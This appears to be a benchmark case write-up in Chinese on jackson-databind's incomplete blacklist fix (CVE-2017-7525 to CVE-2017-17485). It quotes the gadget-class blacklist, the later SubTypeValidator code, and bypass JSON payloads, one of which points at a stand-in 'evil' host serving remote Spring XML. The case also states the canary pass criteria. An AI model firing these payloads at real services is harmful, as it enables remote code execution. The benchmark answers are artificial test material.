# jackson-databind：黑名单按全名精确匹配，Spring 应用上下文不在表里

- Case：`PCBV2-0013`
- 产品：`com.fasterxml.jackson.core:jackson-databind`。开启 default typing 的 REST 服务用 `ObjectMapper.readValue` 按 JSON 里的类名实例化多态类型。
- 链：CVE-2017-7525（2.8.8 → 2.8.9 / 2.9.3 已含，`BeanDeserializerFactory.checkIllegalTypes` + `DEFAULT_NO_DESER_CLASS_NAMES`）→ CVE-2017-17485（2.9.3 → 2.9.4，把守卫迁到 `SubTypeValidator.validateSubType`，对 `org.springframework.` 走父类简单名）
- 源码对着 GitHub tag `jackson-databind-2.9.3` 的 `BeanDeserializerFactory.java`，以及 `jackson-databind-2.9.4` 的 `jsontype/impl/SubTypeValidator.java`。运行时 classpath 上是 Maven Central 的整包 jar。

2017 年 7 月，jackson-databind 给 default typing 加了一张「永远不要反序列化」的 FQCN 集合（databind#1599）。同年 10 月 #1680/#1737 又往同一张表里加了 `JdbcRowSetImpl`、c3p0、部分 Spring AOP 名。NVD CVE-2017-17485 原文：*allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw ... bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.* 维护者 cowtowncoder 在 #1904 里也承认 CVE 指向 #1855，并说 *by definition any blacklists are always incomplete*。

根因不只是「少写了几个类名」。检查插在「`type.getRawClass().getName()` 是否等于集合中某一项」；真正危险的是实例化后的构造 / setter（Spring `FileSystemXmlApplicationContext` 会去拉 XML）；同一次反序列化里已经有 `JavaType` 可以走父类链，2.9.3 没用。下面按 JSON 走进去、2.9.3 的表里有什么、检查之后谁 new 那个类、父类谓词有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

开启 `enableDefaultTyping()`（或等价 `@JsonTypeInfo`）时，JSON 可以点名具体类：

```json
["org.apache.commons.collections.functors.InvokerTransformer", {}]
```

`readValue` → 建 BeanDeserializer → 在构造 deserializer 时跑类型守卫 → 通过则 `new` 该类。设计意图：default typing 只服务应用自己的 DTO，不应实例化 gadget。成功穿越之后的效果是：**守卫放行，无参构造跑起来**。真实利用里 `FileSystemXmlApplicationContext` 会去加载攻击者给的 Spring XML（irsl / vulhub 用远程 `http://evil/spel.xml` 打 SpEL）。本 case 用同名的空影子 bean，构造函数只读 `/canary/flag.txt`，避免在评测里跑真实 gadget。

数据流：

```text
POST /deser  JSON ["<FQCN>", {}]
    → ObjectMapper.readValue(body, Object.class)
         createBeanDeserializer
         V1：checkIllegalTypes(ctxt, type, beanDesc)
              full = type.getRawClass().getName()
              _cfgIllegalClassNames.contains(full) ? 抛异常 : 继续
         实例化该类（无参构造）
    → 响应是否出现 PCB_CANARY_FLAG
```

没有鉴权。类名完全来自请求体。

---

## 原始漏洞：没有任何类名守卫（CVE-2017-7525，2.8.8）

2.8.8 的 `BeanDeserializerFactory` 没有 `checkIllegalTypes`，也没有 `DEFAULT_NO_DESER_CLASS_NAMES`。default typing 下 JSON 点名的任何类都可以解析。#1599 后来写进 2.8.9 的那张表，第一条就是：

```java
s.add("org.apache.commons.collections.functors.InvokerTransformer");
```

本 case 的 seed 用这个名字。2.8.8 上构造函数执行，响应里出现金丝雀。这是 CVE-2017-7525 的入口形态（多态 JSON 数组），不是 7525 的每一种 gadget 都要在本 case 里复现。

---

## 维护者改了什么（CVE-2017-7525 / 15095 修复，落到 2.9.3）

2.9.3 把 #1599 + #1680 + #1737 的精确全名表放在 `BeanDeserializerFactory` 静态块，并在建 deserializer 时调用 `checkIllegalTypes`。GitHub `jackson-databind-2.9.3`：

```java
// BeanDeserializerFactory.java  (2.9.3，约 L45–L80、L954–L966)
protected final static Set<String> DEFAULT_NO_DESER_CLASS_NAMES;
static {
    Set<String> s = new HashSet<>();
    // [databind#1599]
    s.add("org.apache.commons.collections.functors.InvokerTransformer");
    s.add("org.apache.commons.collections.functors.InstantiateTransformer");
    s.add("org.apache.commons.collections4.functors.InvokerTransformer");
    s.add("org.apache.commons.collections4.functors.InstantiateTransformer");
    s.add("org.codehaus.groovy.runtime.ConvertedClosure");
    s.add("org.codehaus.groovy.runtime.MethodClosure");
    s.add("org.springframework.beans.factory.ObjectFactory");
    s.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    s.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
    // [databind#1680]
    s.add("com.sun.rowset.JdbcRowSetImpl");
    // [databind#1737]
    s.add("java.util.logging.FileHandler");
    s.add("java.rmi.server.UnicastRemoteObject");
    s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor");
    s.add("org.springframework.beans.factory.config.PropertyPathFactoryBean");
    s.add("com.mchange.v2.c3p0.JndiRefForwardingDataSource");
    s.add("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource");
    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);
}

protected void checkIllegalTypes(DeserializationContext ctxt, JavaType type,
        BeanDescription beanDesc) throws JsonMappingException {
    String full = type.getRawClass().getName();
    if (_cfgIllegalClassNames.contains(full)) {
        ctxt.reportBadTypeDefinition(beanDesc,
                "Illegal type (%s) to deserialize: prevented for security reasons", full);
    }
}
```

对 seed `InvokerTransformer`，它确实够用：`contains(full)` 为真，在构造之前抛 `Illegal type ... prevented for security reasons`，金丝雀不出现。这就是 v1 + `--seed` 退出码 10，也证明 2.9.3 **已经带着** 7525/15095 那张表，不是「V1 根本没守卫」。

补丁默认了两件事：

1. 危险类型可以用一张有限的 FQCN 列表枚举完。
2. 比较必须是**整个类名相等**；父类、子类、同包其它类都不算。

第二点在 Spring 应用上下文上不成立。`org.springframework.context.support.FileSystemXmlApplicationContext` 不在上表任何一行。表里有的 Spring 名字是 `ObjectFactory`、`AbstractBeanFactoryPointcutAdvisor`、`PropertyPathFactoryBean`——#1737 点名加过 AOP / factory，没有加 ApplicationContext 家族。

2.9.3 **没有** `SubTypeValidator` 这个类（它随 2.8.11 / 2.9.4 的 #1855 出现）。守卫就是上面那个 `contains(full)`。

---

## 消毒之后，类名怎么接到 new 上

`checkIllegalTypes` 一返回，deserializer 继续解析 JSON 对象并实例化 `type.getRawClass()`。没有「构造完成后再看父类是不是 ApplicationContext」的步骤。

`FileSystemXmlApplicationContext` 的真实构造会按参数去 `load` XML；多态 JSON 的第二段可以是 URL 字符串。vulhub 的 CVE-2017-17485 请求是：

```json
["org.springframework.context.support.FileSystemXmlApplicationContext",
 "http://evil/spel.xml"]
```

irsl/jackson-rce-via-spel：*FileSystemXmlApplicationContext is happy to fetch the specified Spring context from anywhere, even from remote location via http.* 本 case 为了只观察守卫，第二段用 `{}`，影子类无参构造读金丝雀。效果通道仍是「守卫放行 → 实例化发生」。

过滤器刚看过的是 FQCN 字符串是否在 HashSet 里；实例化看到的是 Class 对象及其父类。两套「这是不是 Spring 上下文」中间没有第二次谓词。

---

## 仓库里已经有 JavaType / 父类，守卫没用

`checkIllegalTypes` 的参数已经是 `JavaType type`。`type.getRawClass()` 可以 `getSuperclass()` 一直走到 `Object`。2.9.3 只取了 `getName()` 做 HashSet 查找。

谁用了父类：

| 版本 | 对 Spring 的判断 |
|---|---|
| 2.9.3 `checkIllegalTypes` | 精确 FQCN ∈ 集合 |
| 2.9.4 `SubTypeValidator.validateSubType` | 先精确集合；否则若 `full.startsWith("org.springframework.")` 且不是接口，沿父类看 simpleName 是否 `AbstractApplicationContext` 或 `AbstractPointcutAdvisor` |

#1855 标题就是 *Block more serialization gadgets (dbcp/tomcat, spring / CVE-2017-17485)*，评论写 *For some of these need to check parent hierarchy*。2.9.3 的表里甚至已经有一个 Spring 前缀的名字，说明维护者知道 Spring gadget 存在，却仍用枚举而不是「所有 ApplicationContext」。

Cowtowncoder 在 #1904：*Term incomplete is vague given the context -- by definition any blacklists are always incomplete.* 对这张表来说，「永远不完全」不是抽象警告，而是 2.9.3 源码里少了 `FileSystemXmlApplicationContext` 这一行、也没有父类行走。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「HashSet 全名 vs 实例化」落到具体名字：

- `contains(full)`：看是不是表上那十几个字符串之一
- `new FileSystemXmlApplicationContext(...)`：看类能不能加载、构造能不能跑

seed 的 `InvokerTransformer` 在 V1 和 V2 都被挡，因为它在 #1599 就进表了。残余换一个不在表里、但同样能经 default typing 点名的类：

```text
JSON: ["org.springframework.context.support.FileSystemXmlApplicationContext", {}]

full = "org.springframework.context.support.FileSystemXmlApplicationContext"
DEFAULT_NO_DESER_CLASS_NAMES.contains(full) == false
→ 不抛异常 → 实例化 → 金丝雀
```

NVD 写 *through 2.8.10 and 2.9.x through 2.9.3*，*if the Spring libraries are available in the classpath*。`ClassPathXmlApplicationContext` 是同一父类上的兄弟名字，#1855 用 `AbstractApplicationContext` 一次盖住。

V1 拦的是「名字等于某行」；Spring 上下文的危险性在父类行为（加载 XML / 启动容器），不在某一个叶子 FQCN。把叶子一个个加进 HashSet，下一份 gadget 再换子类即可。

---

## 残余仍然走同一条 default typing readValue（CVE-2017-17485）

没有换 API、没有换 enableDefaultTyping、没有换 JSON 数组形态。还是：

```http
POST /deser
["org.springframework.context.support.FileSystemXmlApplicationContext", {}]
```

`createBeanDeserializer` 仍然调用 2.9.3 的 `checkIllegalTypes`。那一次 `contains(full)` 为假；实例化发生；影子构造读出 `/canary/flag.txt`。

本 case residual 写死为上述 FQCN。和 NVD / vulhub / irsl 同一类名。认证意图：v1 + `--residual` 响应中观察到 `PCBFLAG_...`；同一 V1 上 InvokerTransformer 是 BLOCKED。

所以残余不是新洞面，而是同一守卫上三件事叠在一起：精确全名集合；Spring 危险类型是一整族而不是一个名字；检查之后立刻 `new`，没有父类谓词。seed 被挡住只说明「#1599 写进表的那些名字不能再 deser」，不说明「default typing 不能再点名一个会执行危险逻辑的类」。

与 jackson-databind CVE-2017-15095（c3p0 / JdbcRowSet）不是同一条残余：2.9.3 已经含 #1680/#1737，本 case 的 V1 上 InvokerTransformer 被挡、Spring 上下文不被挡。

---

## 后来又补了什么（CVE-2017-17485，2.9.4）

#1855 把守卫挪到 `SubTypeValidator.validateSubType`。2.9.4：

```java
// SubTypeValidator.java  (2.9.4，约 L72–L105)
protected final static String PREFIX_STRING = "org.springframework.";

public void validateSubType(DeserializationContext ctxt, JavaType type,
        BeanDescription beanDesc) throws JsonMappingException {
    final Class<?> raw = type.getRawClass();
    String full = raw.getName();
    main_check:
    do {
        if (_cfgIllegalClassNames.contains(full)) {
            break;
        }
        // [databind#1855]
        if (!raw.isInterface() && full.startsWith(PREFIX_STRING)) {
            for (Class<?> cls = raw; (cls != null) && (cls != Object.class); cls = cls.getSuperclass()) {
                String name = cls.getSimpleName();
                if ("AbstractPointcutAdvisor".equals(name)
                        || "AbstractApplicationContext".equals(name)) {
                    break main_check;
                }
            }
        }
        return;
    } while (false);
    ctxt.reportBadTypeDefinition(beanDesc,
            "Illegal type (%s) to deserialize: prevented for security reasons", full);
}
```

对残余类：`startsWith("org.springframework.")` 为真，父类链上碰到 `AbstractApplicationContext`，break 后报非法类型，构造不跑。公开修复版本：2.6.7.3 / 2.7.9.2 / 2.8.11 / 2.9.4。

即便如此，这仍然是黑名单：精确集合 + 两条 Spring 父类简单名。维护者在 #1904 说黑名单定义上就不完全。本 benchmark 的 v2 只关闭 ApplicationContext 这一条 reference residual。后续年份 jackson 还有更多 gadget CVE，不在本 case 窗口里。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是一张 FQCN HashSet。真正造成 RCE 的是实例化后的类行为。2.9.4 才开始对 Spring 前缀走父类，等于承认「按叶子名枚举」盖不住这一族。2.9.3 的 diff（相对 2.8.8）看不到 `AbstractApplicationContext`。

**不是没有更好的谓词。**  
`JavaType` / `Class.getSuperclass()` 一直可用。#1855 自己说 *need to check parent hierarchy*。从 V1 源码只能看到 `contains(full)`；要判断补丁是否闭合，必须把表里的名字和 classpath 上真实 gadget 对一遍，并问「子类换个名字是否仍危险」。

**同一 `readValue`、同一 JSON 数组，只换了中间那个类名。**  
InvokerTransformer 和 FileSystemXmlApplicationContext 都是 default typing 点名 + 构造副作用。flag 都是「实例化是否发生」。

**default typing 把类名交给了请求。**  
关闭 default typing、或改用白名单多态，比继续加黑名单更接近「不要反序列化未信任类型」。本链两次补丁都选择加名单。

---

## 版本、入口、参考

| | jackson-databind | 守卫 | InvokerTransformer seed | FileSystemXmlApplicationContext residual |
|---|---|---|---|---|
| V0 | 2.8.8 | 无 | 实例化，金丝雀 | （不必） |
| V1 | 2.9.3 | `checkIllegalTypes` 精确 FQCN | Illegal type，无 flag | 不在表中，实例化，金丝雀 |
| V2 | 2.9.4 | `SubTypeValidator` + Spring 父类 simpleName | 挡 | AbstractApplicationContext 命中，挡 |

- Web：`POST /deser`，body `["<FQCN>", {}]`
- 认证意图：v0 seed 观察到 flag；v1 seed BLOCKED；v1 residual 观察到 flag。
- [CVE-2017-7525](https://nvd.nist.gov/vuln/detail/CVE-2017-7525)、[CVE-2017-17485](https://nvd.nist.gov/vuln/detail/CVE-2017-17485)（NVD 写明 incomplete fix）
- [databind#1855](https://github.com/FasterXML/jackson-databind/issues/1855)、[#1904](https://github.com/FasterXML/jackson-databind/issues/1904)
- [irsl/jackson-rce-via-spel](https://github.com/irsl/jackson-rce-via-spel/)、[vulhub jackson CVE-2017-7525 目录中的 17485 说明](https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525)
- 源码：[BeanDeserializerFactory.java @ 2.9.3](https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.3/src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java)、[SubTypeValidator.java @ 2.9.4](https://github.com/FasterXML/jackson-databind/blob/jackson-databind-2.9.4/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)
